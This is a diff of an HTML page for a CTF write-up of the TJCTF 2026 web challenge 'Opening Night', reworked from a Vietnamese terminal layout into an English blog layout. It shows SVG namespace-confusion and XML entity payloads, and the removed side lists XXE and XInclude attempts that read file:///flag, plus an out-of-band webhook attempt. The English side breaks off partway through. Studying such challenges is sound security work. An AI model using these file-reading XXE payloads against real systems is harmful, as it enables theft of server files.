@@ -1,552 +1,516 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en" class="dark">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Yuri08 - TJCTF 2026: Opening Night</title>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
-  <style>
-    :root {
-      --main: #7c3aed; --main2: #10b981; --main-light: #a78bfa;
-      --bg: #0f0f1a; --bg2: #181a2a; --glass: rgba(30, 25, 60, 0.9);
-      --text: #e0e7ef; --shadow: 0 8px 32px 0 #7c3aed33;
-      --glow: 0 0 20px 2px #7c3aed44; --highlight: #38bdf8;
-    }
-    html, body {
-      min-height: 100%; margin: 0; font-family: 'JetBrains Mono', monospace;
-      background: radial-gradient(circle at 50% 0%, #1a1a3a 0%, #0f0f1a 100%);
-      color: var(--text); overflow: hidden; perspective: 1000px;
-    }
-    #particles-js {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none;
-    }
-    .content-wrapper {
-      position: relative; z-index: 1; height: 100vh; display: flex; flex-direction: column;
-      padding: 20px; box-sizing: border-box; gap: 15px;
-    }
-    
-    /* Header Profile */
-    .header {
-      display: flex; align-items: center; gap: 20px; padding: 15px;
-      background: var(--glass); border-radius: 1rem; border: 1px solid #7c3aed44;
-      box-shadow: var(--shadow); backdrop-filter: blur(10px); flex-shrink: 0;
-    }
-    .avatar {
-      width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--main);
-      object-fit: cover; box-shadow: 0 0 15px var(--main);
-    }
-    .header-info h1 {
-      font-size: 1.8rem; margin: 0; color: var(--main);
-      text-shadow: 0 0 10px #7c3aed88; animation: neon 2s infinite alternate;
-    }
-    .header-info p { margin: 5px 0 0 0; color: var(--main-light); font-size: 0.9rem; }
-    @keyframes neon { to { text-shadow: 0 0 15px var(--main), 0 0 30px var(--main); } }
-    
-    .lang-toggle {
-      margin-left: auto; background: var(--main); color: white; border: none;
-      padding: 8px 15px; border-radius: 0.5rem; cursor: pointer; font-family: inherit;
-      font-weight: bold; transition: 0.3s; box-shadow: 0 0 10px #7c3aed55;
-    }
-    .lang-toggle:hover { background: var(--main-light); transform: scale(1.05); }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TJCTF 2026: Opening Night — QA210</title>
+<meta name="description" content="TJCTF 2026 Opening Night — Web / SVG / Parser Differential walkthrough by QA210">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎭</text></svg>">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-xml-doc.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
 
-    /* Terminal Body */
-    .terminal-pro {
-      background: linear-gradient(135deg, #12121f 80%, #7c3aed11 100%);
-      border-radius: 1rem; border: 1px solid #312e8155; box-shadow: var(--shadow), var(--glow);
-      display: flex; flex-direction: column; flex-grow: 1; overflow: hidden; position: relative;
-    }
-    .terminal-pro::before {
-      content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-      background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px);
-      pointer-events: none; z-index: 2; opacity: 0.2;
-    }
-    .terminal-bar {
-      background: #1e1e2e; height: 2.5rem; display: flex; align-items: center;
-      padding: 0 1rem; border-bottom: 1px solid #312e8155; flex-shrink: 0; z-index: 3;
-    }
-    .dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 6px; }
-    .red { background: #ef4444; } .yellow { background: #facc15; } .green { background: #22c55e; }
-    .terminal-title { color: var(--main-light); margin-left: 1rem; font-weight: bold; letter-spacing: 1px; }
-    
-    .terminal-body {
-      padding: 1.5rem; flex-grow: 1; overflow-y: auto; font-size: 0.95rem;
-      line-height: 1.6; position: relative; z-index: 1; scroll-behavior: smooth;
-    }
-    #terminal-output { white-space: pre-wrap; word-break: break-word; }
-    #terminal-input-line {
-      display: flex; align-items: center; gap: 0.5em; margin-top: 1em; z-index: 3;
-    }
-    #terminal-input {
-      background: transparent; border: none; color: #a7f3d0; outline: none;
-      font-family: inherit; font-size: 1em; width: 100%; caret-color: var(--main2);
-    }
-    
-    /* Syntax Highlighting */
-    .cmd { color: #7c3aed; } .arg { color: #a78bfa; } .info { color: #38bdf8; font-weight: bold; }
-    .error { color: #ef4444; } .success { color: #10b981; } .warning { color: #facc15; }
-    .code-block {
-      background: #0d0d1a; border-left: 3px solid var(--main); padding: 10px 15px;
-      margin: 10px 0; border-radius: 0 5px 5px 0; font-size: 0.9rem; color: #d1d5db;
-    }
-    
-    /* Scrollbar */
-    .terminal-body::-webkit-scrollbar { width: 8px; }
-    .terminal-body::-webkit-scrollbar-track { background: #0f0f1a; }
-    .terminal-body::-webkit-scrollbar-thumb { background: #7c3aed; border-radius: 4px; }
+:root {
+  --bg-primary:#0d1117;--bg-secondary:#161b22;--bg-tertiary:#1c2333;
+  --bg-code:#0d1117;--border:#30363d;--border-light:#21262d;
+  --text-primary:#e6edf3;--text-secondary:#8b949e;--text-muted:#6e7681;
+  --accent-green:#3fb950;--accent-blue:#58a6ff;--accent-red:#f85149;
+  --accent-yellow:#d29922;--accent-purple:#bc8cff;--accent-orange:#f0883e;
+  --accent-cyan:#39d353;--accent-pink:#f778ba;
+  --link:#58a6ff;--link-hover:#79c0ff;
+  --scrollbar-thumb:#30363d;--scrollbar-track:#161b22;
+  --toc-active:#58a6ff;
+  --callout-info-bg:rgba(56,139,253,0.1);--callout-info-border:#388bfd;
+  --callout-warn-bg:rgba(210,153,34,0.1);--callout-warn-border:#d29922;
+  --callout-danger-bg:rgba(248,81,73,0.1);--callout-danger-border:#f85149;
+  --callout-success-bg:rgba(63,185,80,0.1);--callout-success-border:#3fb950;
+  --callout-hint-bg:rgba(188,140,255,0.08);--callout-hint-border:#bc8cff;
+}
 
-    /* Welcome Screen */
-    #welcome-screen {
-      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-      background: #0f0f1a; z-index: 10000; display: flex; flex-direction: column;
-      justify-content: center; align-items: center; text-align: center; transition: opacity 0.8s;
-    }
-    #welcome-screen.hidden { opacity: 0; pointer-events: none; }
-    #start-button {
-      background: var(--main); color: white; border: none; border-radius: 0.7rem;
-      padding: 1rem 2rem; font-size: 1.2rem; font-weight: 700; cursor: pointer;
-      font-family: inherit; transition: all 0.3s; box-shadow: 0 0 20px #7c3aed88;
-    }
-    #start-button:hover { background: var(--main-light); transform: translateY(-3px); }
-    
-    #mute-button {
-      position: fixed; top: 20px; right: 20px; z-index: 10001;
-      background: #1e1e2e; color: var(--main-light); border: 1px solid #7c3aed55;
-      border-radius: 50%; width: 40px; height: 40px; font-size: 1.2rem; cursor: pointer;
-      display: flex; justify-content: center; align-items: center; transition: all 0.3s;
-    }
-    #mute-button:hover { background: var(--main); color: white; }
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--scrollbar-thumb) var(--scrollbar-track)}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.75;font-size:16px}
 
-    @media (max-width: 768px) {
-      .header { flex-wrap: wrap; justify-content: center; text-align: center; }
-      .lang-toggle { margin-left: 0; margin-top: 10px; width: 100%; }
-      .avatar { width: 60px; height: 60px; }
-      .header-info h1 { font-size: 1.4rem; }
-    }
-  </style>
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:var(--scrollbar-track)}
+::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:#484f58}
+
+a{color:var(--link);text-decoration:none;transition:color .2s}
+a:hover{color:var(--link-hover)}
+
+.site-header{position:sticky;top:0;z-index:100;background:rgba(13,17,23,0.85);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+.site-header .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1.15rem;color:var(--accent-green);display:flex;align-items:center;gap:8px}
+.site-header .logo .dot{color:var(--accent-red)}
+.site-header nav{display:flex;gap:1.5rem;align-items:center}
+.site-header nav a{color:var(--text-secondary);font-size:.875rem;font-weight:500}
+.site-header nav a:hover{color:var(--text-primary)}
+.hamburger{display:none;background:none;border:none;color:var(--text-primary);cursor:pointer;font-size:1.5rem}
+
+.page-layout{display:grid;grid-template-columns:260px 1fr;max-width:1400px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc-sidebar{position:sticky;top:56px;height:calc(100vh - 56px);overflow-y:auto;padding:1.5rem 1rem 1.5rem 1.5rem;border-right:1px solid var(--border);background:var(--bg-primary)}
+.toc-sidebar h3{font-size:.75rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-muted);margin-bottom:.75rem;font-weight:600}
+.toc-sidebar ul{list-style:none}
+.toc-sidebar li{margin-bottom:2px}
+.toc-sidebar a{display:block;padding:4px 8px;border-radius:4px;font-size:.8rem;color:var(--text-secondary);transition:all .15s;line-height:1.4}
+.toc-sidebar a:hover{color:var(--text-primary);background:var(--bg-secondary)}
+.toc-sidebar a.active{color:var(--toc-active);background:rgba(88,166,255,0.1);font-weight:600}
+.toc-sidebar .toc-h3{padding-left:18px;font-size:.75rem}
+
+.main-content{padding:2.5rem 3rem 4rem;max-width:860px;width:100%}
+
+.page-hero{margin-bottom:2.5rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}
+.page-hero .box-badge{display:inline-block;background:var(--accent-purple);color:#fff;font-size:.7rem;font-weight:700;padding:2px 10px;border-radius:12px;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem}
+.page-hero h1{font-size:2.25rem;font-weight:800;margin-bottom:.5rem;letter-spacing:-.02em}
+.page-hero .meta{color:var(--text-secondary);font-size:.875rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center}
+.page-hero .meta .sep{color:var(--text-muted)}
+
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem}
+.box-info-card .info-item .label{font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-muted);margin-bottom:2px;font-weight:600}
+.box-info-card .info-item .value{font-size:.95rem;font-weight:600;color:var(--text-primary)}
+
+.attack-path{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.7;overflow-x:auto}
+.attack-path .step{display:flex;align-items:baseline;gap:.5rem;margin-bottom:.25rem}
+.attack-path .arrow{color:var(--accent-green)}
+.attack-path .technique{color:var(--accent-orange)}
+.attack-path .cred{color:var(--accent-purple)}
+
+.main-content h2{font-size:1.6rem;font-weight:800;margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:2px solid var(--border);letter-spacing:-.01em;scroll-margin-top:70px}
+.main-content h3{font-size:1.15rem;font-weight:700;margin:1.75rem 0 .75rem;color:var(--text-primary);scroll-margin-top:70px}
+.main-content h4{font-size:1rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text-secondary)}
+.main-content p{margin-bottom:1rem;color:var(--text-secondary);line-height:1.8}
+
+.code-block-wrapper{position:relative;margin:1rem 0 1.25rem;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.code-block-header{display:flex;justify-content:space-between;align-items:center;padding:6px 14px;background:var(--bg-tertiary);border-bottom:1px solid var(--border);font-size:.72rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.code-block-header .lang-label{text-transform:uppercase;font-weight:600;letter-spacing:.04em}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--text-muted);font-size:.7rem;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.copy-btn:hover{color:var(--text-primary);border-color:var(--text-muted)}
+.copy-btn.copied{color:var(--accent-green);border-color:var(--accent-green)}
+.code-block-wrapper pre{margin:0!important;padding:1rem!important;background:var(--bg-code)!important;font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important;line-height:1.6!important;overflow-x:auto}
+.code-block-wrapper code{font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important}
+
+p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padding:1px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.82em;color:var(--accent-orange)}
+
+.callout{padding:.85rem 1rem;border-radius:6px;border-left:3px solid;margin:1rem 0 1.25rem;font-size:.9rem}
+.callout p{margin:0;color:var(--text-secondary)}
+.callout-title{font-weight:700;font-size:.8rem;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.callout-info{background:var(--callout-info-bg);border-color:var(--callout-info-border)}
+.callout-info .callout-title{color:var(--callout-info-border)}
+.callout-warn{background:var(--callout-warn-bg);border-color:var(--callout-warn-border)}
+.callout-warn .callout-title{color:var(--callout-warn-border)}
+.callout-danger{background:var(--callout-danger-bg);border-color:var(--callout-danger-border)}
+.callout-danger .callout-title{color:var(--callout-danger-border)}
+.callout-success{background:var(--callout-success-bg);border-color:var(--callout-success-border)}
+.callout-success .callout-title{color:var(--callout-success-border)}
+.callout-hint{background:var(--callout-hint-bg);border-color:var(--callout-hint-border)}
+.callout-hint .callout-title{color:var(--callout-hint-border)}
+
+.main-content ul,.main-content ol{margin:.5rem 0 1rem 1.5rem;color:var(--text-secondary)}
+.main-content li{margin-bottom:.35rem;line-height:1.7}
+.main-content table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.85rem}
+.main-content th,.main-content td{padding:8px 12px;border:1px solid var(--border);text-align:left}
+.main-content th{background:var(--bg-secondary);font-weight:600;color:var(--text-primary);font-size:.75rem;text-transform:uppercase;letter-spacing:.04em}
+.main-content td{color:var(--text-secondary)}
+
+.site-footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;color:var(--text-muted);font-size:.8rem}
+.toc-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:200}
+.toc-overlay.show{display:block}
+.toc-mobile-panel{display:none;position:fixed;left:0;top:0;bottom:0;width:280px;background:var(--bg-primary);border-right:1px solid var(--border);z-index:201;overflow-y:auto;padding:1.5rem}
+.toc-mobile-panel.show{display:block}
+.toc-mobile-panel .close-btn{background:none;border:none;color:var(--text-secondary);font-size:1.2rem;cursor:pointer;float:right}
+
+@media(max-width:1024px){.page-layout{grid-template-columns:1fr}.toc-sidebar{display:none}.hamburger{display:block}.main-content{padding:1.5rem 1.25rem 3rem}.page-hero h1{font-size:1.75rem}}
+@media(max-width:640px){.site-header{padding:0 1rem}.main-content{padding:1rem .75rem 2rem}.page-hero h1{font-size:1.4rem}.box-info-card{grid-template-columns:1fr 1fr}}
+</style>
 </head>
 <body>
 
-  <div id="welcome-screen">
-    <h1 style="color: var(--main); text-shadow: 0 0 20px var(--main-light); margin-bottom: 20px;">Yuri08 CTF Terminal</h1>
-    <p style="color: #a78bfa; margin-bottom: 30px;">TJCTF 2026 - Web / Opening Night</p>
-    <button id="start-button">Khởi tạo Terminal</button>
+<!-- ═══ Header ═══ -->
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="#">Tools</a>
+    <a href="#">About</a>
+  </nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">☰</button>
+</header>
+
+<!-- ═══ Mobile TOC ═══ -->
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">✕</button>
+  <h3 style="margin-top:1rem">Table of Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<!-- ═══ Layout ═══ -->
+<div class="page-layout">
+
+<!-- ── TOC Sidebar ── -->
+<aside class="toc-sidebar">
+  <h3>Contents</h3>
+  <ul id="tocDesktop"></ul>
+</aside>
+
+<!-- ── Main Content ── -->
+<main class="main-content">
+
+<!-- ═══ HERO ═══ -->
+<div class="page-hero">
+  <span class="box-badge">Web</span>
+  <h1>TJCTF 2026: Opening Night</h1>
+  <div class="meta">
+    <span>QA210</span>
+    <span class="sep">·</span>
+    <span>May 2026</span>
+    <span class="sep">·</span>
+    <span>SVG · Parser Differential · XXE</span>
   </div>
+</div>
 
-  <button id="mute-button" aria-label="Toggle Sound"><i class="bi bi-volume-up-fill"></i></button>
-  <div id="particles-js"></div>
+<!-- ═══ BOX INFO ═══ -->
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Challenge</div><div class="value">Opening Night</div></div>
+  <div class="info-item"><div class="label">Category</div><div class="value" style="color:var(--accent-purple)">Web</div></div>
+  <div class="info-item"><div class="label">CTF</div><div class="value">TJCTF 2026</div></div>
+  <div class="info-item"><div class="label">Solves</div><div class="value">~30</div></div>
+  <div class="info-item"><div class="label">Flag</div><div class="value" style="color:var(--accent-green)">tjctf{y0ur_4r7w0rk...}</div></div>
+</div>
 
-  <div class="content-wrapper">
-    <header class="header">
-      <img src="https://files.catbox.moe/755fgv.png" alt="Avatar" class="avatar" />
-      <div class="header-info">
-        <h1>Yuri08</h1>
-        <p>White-Hat Hacker | Parser Differential Expert</p>
-      </div>
-      <button class="lang-toggle" id="lang-btn" onclick="toggleLang()">Switch to English</button>
-    </header>
+<!-- ═══ ATTACK PATH ═══ -->
+<div class="attack-path">
+  <div class="step"><span class="arrow">→</span> Upload SVG with fake-namespace title/desc <span class="arrow">→</span> <span class="technique">Label parser ignores namespace</span></div>
+  <div class="step"><span class="arrow">→</span> HTML-escape entire XML document <span class="arrow">→</span> <span class="technique">Gatekeeper sees text, not XML</span></div>
+  <div class="step"><span class="arrow">→</span> Backend calls html.unescape() before XML parse <span class="arrow">→</span> <span class="technique">DOCTYPE + Entity become real</span></div>
+  <div class="step"><span class="arrow">→</span> Entity expands in decoded XML <span class="arrow">→</span> <span class="cred">Flag in label output</span></div>
+</div>
 
-    <section class="terminal-pro">
-      <div class="terminal-bar">
-        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
-        <span class="terminal-title">root@tjctf:~/opening-night#</span>
-      </div>
-      <div class="terminal-body" id="terminal-body">
-        <pre id="terminal-output"></pre>
-        <div id="terminal-input-line">
-          <span class="cmd">root@tjctf</span>:<span class="arg">~/opening-night</span>$           <input type="text" id="terminal-input" autocomplete="off" spellcheck="false" />
-        </div>
-      </div>
-    </section>
-  </div>
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="overview">Challenge Overview</h2>
 
-  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-  <script>
-    let isMuted = false;
-    let currentLang = 'vi';
-    let userInteracted = false;
-    const output = document.getElementById('terminal-output');
-    const input = document.getElementById('terminal-input');
-    const tBody = document.getElementById('terminal-body');
+<p>The challenge presents a web gallery where users can upload SVG artwork. Each uploaded file is processed server-side: the SVG gets validated, and then metadata (title, description, dimensions) is extracted and displayed on the gallery page. The key observation is that the output renders into three specific HTML sinks:</p>
 
-    particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json');
-
-    function playAudio(src, vol=0.2) {
-      if (!userInteracted || isMuted || !src) return;
-      try { const a = new Audio(src); a.volume = vol; a.play(); } catch(e) {}
-    }
-
-    document.getElementById('mute-button').addEventListener('click', function() {
-      isMuted = !isMuted;
-      this.querySelector('i').className = isMuted ? 'bi bi-volume-mute-fill' : 'bi bi-volume-up-fill';
-    });
-
-    function print(html) {
-      const div = document.createElement('div');
-      div.innerHTML = html;
-      output.appendChild(div);
-      tBody.scrollTop = tBody.scrollHeight;
-    }
-
-    // --- TRANSLATIONS & DETAILED WRITEUP DATA ---
-    const L = {
-      vi: {
-        help: `<span class="info">[ Hướng Dẫn Đọc Writeup ]</span>
-<span class="cmd">intro</span>       : Tổng quan Challenge & Gợi ý
-<span class="cmd">bug1</span>        : Lỗ hổng 1 - Namespace Confusion (Phân tích nhãn)
-<span class="cmd">dead1</span>       : Bế tắc 1 - Raw DOCTYPE không hoạt động
-<span class="cmd">dead2</span>       : Bế tắc 2 - External XXE & XInclude bị chặn
-<span class="cmd">dead3</span>       : Bế tắc 3 - Không phải SSTI hay Multipart
-<span class="cmd">break</span>       : Nghịch lý Giải mã - Chìa khóa (Parser Differential)
-<span class="cmd">exploit</span>     : Xây dựng Payload & Khai thác Cuối cùng
-<span class="cmd">code</span>        : Source Code Exploit (Python)
-<span class="cmd">clear</span>       : Xóa màn hình Terminal`,
-        intro: `<span class="info">[ TỔNG QUAN: OPENING NIGHT ]</span>
-<span class="cmd">Category:</span> Web / SVG / Parser Differential
-<span class="cmd">Flag:</span> <span class="success">tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}</span>
-
-<span class="warning">Mô tả:</span> "Bộ sưu tập mới mở cửa tối nay." (Trang web cho phép upload SVG và hiển thị như một gallery).
-
-<span class="cmd">Hint 1:</span> Hai người quản lý kiểm tra tác phẩm: một người treo bức tranh (cẩn thận), người kia viết nhãn (cẩu thả).
-<span class="cmd">Hint 2:</span> Người gác cửa chỉ kiểm tra file trông giống SVG ở phần đầu. Người viết nhãn lấy title/desc đầu tiên nó thấy theo tên, chứ không quan tâm đến namespace thật.
-<span class="cmd">Hint 3:</span> Đừng tìm phòng ẩn, hãy thay đổi cách "gói" tác phẩm trước khi nó tới! Payload phải sống sót qua 2 cách diễn giải: một cái vô hại, một cái là XML.
-
-Mục tiêu hiện thị của web:
-<div class="code-block">&lt;h2&gt;some title&lt;/h2&gt;
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">html</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;h2&gt;some title&lt;/h2&gt;
 &lt;p&gt;some description&lt;/p&gt;
-&lt;dd&gt;700 x 160&lt;/dd&gt;</div>`,
-        bug1: `<span class="info">[ LỖ HỔNG 1: NAMESPACE CONFUSION ]</span>
-Người viết nhãn (Label Parser) lấy title/desc theo tên thẻ, bỏ qua namespace. Thay vì dùng thẻ SVG chuẩn, ta có thể dùng namespace giả:
+&lt;dd&gt;700 x 160&lt;/dd&gt;</code></pre>
+</div>
 
-<div class="code-block">&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+<p>The challenge description says <em>"The new gallery opens tonight."</em> Three hints are provided that point toward a two-stage parsing pipeline with a differential vulnerability between the stages. Understanding how each stage interprets the uploaded file is the crux of this challenge.</p>
+
+<div class="callout callout-hint">
+  <div class="callout-title">Hint 1</div>
+  <p>Two curators inspect each piece: one hangs the painting (carefully), the other writes the label (sloppily).</p>
+</div>
+
+<div class="callout callout-hint">
+  <div class="callout-title">Hint 2</div>
+  <p>The gatekeeper only checks that your file looks like an SVG at the top. The label writer takes the first title/desc it sees by name, ignoring true namespace.</p>
+</div>
+
+<div class="callout callout-hint">
+  <div class="callout-title">Hint 3</div>
+  <p>Don't look for hidden rooms, change how your art is "wrapped"! Payload must survive two interpretations: harmless text vs. XML.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="namespace">Bug: Namespace Confusion</h2>
+
+<p>The label parser extracts metadata by searching for elements named <code>title</code> and <code>desc</code> without verifying their XML namespace. This means we can inject elements with a fake namespace that the label writer will still match. The SVG validation stage accepts them because they belong to a different namespace and don't violate SVG structural rules.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
   &lt;metadata&gt;
-    &lt;x:title xmlns:x="urn:not-svg"&gt;MARK_CUSTOM_TITLE&lt;/x:title&gt;
-    &lt;x:desc xmlns:x="urn:not-svg"&gt;MARK_CUSTOM_DESC&lt;/x:desc&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;INJECTED_TITLE&lt;/x:title&gt;
+    &lt;x:desc xmlns:x="urn:not-svg"&gt;INJECTED_DESC&lt;/x:desc&gt;
   &lt;/metadata&gt;
   &lt;title&gt;SAFE_TITLE&lt;/title&gt;
   &lt;desc&gt;SAFE_DESC&lt;/desc&gt;
-&lt;/svg&gt;</div>
+&lt;/svg&gt;</code></pre>
+</div>
 
-Kết quả server trả về:
-<span class="success">h2: 'MARK_CUSTOM_TITLE'</span>
-<span class="success">p : 'MARK_CUSTOM_DESC'</span>
+<p>The server renders:</p>
 
-Điều này chứng minh parser dùng hàm kiểu <span class="cmd">find("title")</span> hoặc <span class="cmd">//*[local-name()="title"]</span>, cho phép ta kiểm soát nội dung nhãn dễ dàng. Tuy nhiên, đến đây vẫn chưa ra được flag.`,
-        dead1: `<span class="info">[ BẾ TẮC 1: RAW DOCTYPE KHÔNG EXPAND ]</span>
-Ta đã kiểm soát được nhãn, bước tiếp theo là Entity Expansion. Ta thử payload XML với DOCTYPE chuẩn:
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">output</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code>h2: 'INJECTED_TITLE'
+p : 'INJECTED_DESC'</code></pre>
+</div>
 
-<div class="code-block">&lt;!DOCTYPE svg [
+<p>This confirms the parser uses a namespace-blind selector — likely <code>find("title")</code> or <code>//*[local-name()="title"]</code>. We can control the label content freely, but this alone doesn't yield the flag. We need a way to introduce dynamic content expansion.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="dead-ends">Dead Ends</h2>
+
+<h3 id="dead-doctype">Raw DOCTYPE Doesn't Expand</h3>
+<p>Since we control the label, the natural next step is XML entity expansion. We try uploading a document with an internal entity declaration:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;!DOCTYPE svg [
   &lt;!ENTITY e "ENTITY_OK"&gt;
 ]&gt;
 &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
   &lt;metadata&gt;
     &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
   &lt;/metadata&gt;
-&lt;/svg&gt;</div>
+&lt;/svg&gt;</code></pre>
+</div>
 
-Kết quả trả về:
-<span class="error">h2: '&e;'</span>
+<p>The output is devastating:</p>
 
-Entity <span class="arg">&e;</span> KHÔNG được mở rộng! Parser đã đọc nó như một chuỗi thuần. Đó là một cạm bẫy lớn, khiến nhiều người tưởng entity expansion không thể dùng được.`,
-        dead2: `<span class="info">[ BẾ TẮC 2: EXTERNAL XXE & XINCLUDE BỊ CHẶN ]</span>
-Vì internal entity thất bại, ta thử các hướng XXE khác:
-- <span class="error">External Entity:</span> <span class="cmd">&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span> -> Không đọc được file.
-- <span class="error">OOB Parameter Entities:</span> Dùng webhook.site -> Webhook không nhận được request nào.
-- <span class="error">XInclude:</span> <span class="cmd">&lt;xi:include href="file:///flag" parse="text"/&gt;</span> -> Không được xử lý.
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">output</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code>h2: '&amp;e;'</code></pre>
+</div>
 
-Rõ ràng, external entity loading đã bị vô hiệu hóa hoàn toàn. Đây không phải là bài XXE đọc file thông thường.`,
-        dead3: `<span class="info">[ BẾ TẮC 3: KHÔNG PHẢI SSTI HAY MULTIPART ]</span>
-Gợi ý nhắc đến việc "thay đổi cách gói", nên ta thử:
-- <span class="cmd">Multipart Confusion:</span> Gửi cả text field và file field, duplicate file parts, thay đổi Content-Transfer-Encoding (base64, quoted-printable). -> App luôn dùng file part thật và từ chối base64.
-- <span class="cmd">SSTI:</span> Upload label chứa <span class="arg">{{7*7}}</span> -> Server in y nguyên ra màn hình.
+<p>The entity reference <code>&amp;e;</code> is <strong>not expanded</strong>. The parser treats it as a literal string. This is a major trap that leads many solvers to conclude that entity expansion is simply impossible on this server.</p>
 
-Tất cả các hướng nhập môn đều thất bại!`,
-        break: `<span class="info">[ NGHỊCH LÝ GIẢI MÃ: PARSER DIFFERENTIAL ]</span>
-Chìa khóa nằm ở hint: "Payload phải sống sót qua 2 cách diễn giải. Một cái vô hại, một cái là XML."
+<h3 id="dead-xxe">External XXE and XInclude Blocked</h3>
